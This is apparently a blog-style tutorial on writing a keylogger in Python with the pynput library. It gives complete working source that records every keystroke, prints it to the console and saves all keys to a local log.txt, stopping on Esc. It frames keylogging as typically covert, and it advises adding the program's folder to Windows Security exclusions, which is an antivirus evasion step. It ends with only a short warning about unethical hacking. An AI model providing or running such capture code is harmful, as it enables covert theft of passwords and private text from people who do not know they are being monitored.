Key Logger ⌨️| Python

Introduction:

Keystroke logging, often referred to as keylogging or keyboard capturing, is the action of recording (logging) the keys struck on a keyboard,[1][2] typically covertly, so that a person using the keyboard is unaware that their actions are being monitored. Data can then be retrieved by the person operating the logging program.
Using the python pynput package we can implement the keylogger concept. This library allows you to control and monitor input devices, that is how we will be controlling the keyboard inputs to log the keystrokes.
In our project the logs will be saved in text(.txt) file that will reside in the same folder as the program.
Project Prerequisites:

You have to install the package called pynput for this project
pynput -  https://pypi.org/project/pynput/

Now then, shall we begin…

NOTE: I will be using PyCharm Community Edition IDE.So, the steps I mention are specific to that IDE only.
You can also write the program in IDE of your choice; I have mentioned the requirements in the end notes of this article. 
First of all, we need to create a project folder with name MyKeyLoggerProject and after we need to create a KeyLogger.py file in the project folder.
To install the pynput package:
Click on the file button and then Setting or you can directly press Ctrl+Alt+S
to open the settings
There you will find the Project:MyKeyLoggerProject option click on that and then on the Python Interpereter.
Now to install the pynput package click on the ‘+’ symbol above the Package and search for pyput and then click Install Package.

A message will be displayed – “Package ‘pynput’ installed successfully”. Close the settings.


Code Implementation:

Before going to use the pynput.keyboard package let us know what exactly does it offer us to work on our keylogger project.
The package pynput.keyboard contains classes for controlling and monitoring the keyboard. pynput is the library of Python that can be used to capture keyboard inputs there the coolest use of this can lie in making keyloggers. The code for the keylogger is given below.
First we import the modules Key, Listener from the package pynput.keyboard
from pynput.keyboard import Key, Listener

Key class is used to determine the type of the key that is being pressed.
The Listener is used to get the keystrokes on the keyboard continuously.

Now we create an empty list named keys to store all the key strokes to write them into the file.
keys = [] # empty list to add the keystrokes

To listen to the keystrokes and write them to the log file we will be using a total of 3 functions namely:
1.on_press: in this function every key that is pressed is added to the keys list and the function to write it to the log file is called. Also the type of key that is pressed will be printed in the console/terminal.
# function to print which key is being pressed

def on_press(key):
    keys.append(key)
    write_file(keys)
    try:
        print('alphanumeric key {0} pressed'.format(key.char))
    except AttributeError:
        pass
        print('special key {0} pressed'.format(key))

The try and except are used to handle exception caused when special keys are pressed.

2.on_release: in this function we will be printing every key that is released in the console/terminal and will stop the program if esc is pressed and released.
# function to print which key is being released and end Listener if esc is pressed
def on_release(key):
    print('{0} released'.format(key))
    if key == Key.esc:
        # Stop listener when esc is pressed
        return False

The program ends when the esc key is pressed and released.

3.write_file: this function is used to write all the key strokes to the log file.
# function to write the keystrokes to the log file
def write_file(keys):
    with open('log.txt', 'w') as f:
        for key in keys:
            # removing '' of the strings
            k = str(key).replace("'", "")
            f.write(k)
            # space between every keystroke for readability
            f.write(' ')

The Listener gives all the keystrokes inside single quotes(‘) so we use the replace method to replace them with null.

Last, we create a Listener instance to call the above functions when a key is pressed or released accordingly. We pass two parameter namely on_press and on_release.
The with keyword is used to allocate resources to the Listener object and release them automatically when the task is completed.
join() -  adds single quotes to each keystroke and join them together.

with Listener(on_press=on_press,
              on_release=on_release) as listener:
    listener.join() # joins all the keystrokes together

Yup!!! We have successfully implemented the code for Key Logging.
This is the complete source code of this project.

# keylogger using pynput module

from pynput.keyboard import Key, Listener

keys = [] # empty list to add the keystrokes

# function to print which key is being pressed
def on_press(key):
    keys.append(key)
    write_file(keys)

    try:
        print('alphanumeric key {0} pressed'.format(key.char))

    except AttributeError:
        pass
        print('special key {0} pressed'.format(key))

# function to write the keystrokes to the log file
def write_file(keys):
    with open('log.txt', 'w') as f:
        for key in keys:
            # removing '' of the strings
            k = str(key).replace("'", "")
            f.write(k)
            # space between every keystroke for readability
            f.write(' ')

# function to print which key is being released and end Listener if esc is pressed
def on_release(key):
    print('{0} released'.format(key))
    if key == Key.esc:
        # Stop listener when esc is pressed
        return False


with Listener(on_press=on_press,
              on_release=on_release) as listener:
    listener.join() # joins all the keystrokes together

Now, right click on the mouse and run the program 
After the program starts running open the notepad using mouse and write hello
The output will be as shown below

As you can see the left side the terminal where we can see which key is pressed and released while we write hello in the notepad.
After this press esc to stop the program and open the log file in the same folder as the program.
You will see the following:

As you can see the keys, we pressed on the keyboard are logged into the log file.

NOTE: This program can be executed in any IDE of your choice. You only need to install the pynput package using the cmd
Command for installing pynput through cmd – pip install pynput
NOTE: You should add the folder that you are writing the program in to exclusions in the windows security to be able to run it.
Remember this project can be used for hacking and unethical hacking is punishable so careful what you use this project for.

All done, congratulations you have learnt how to make a keylogger using python.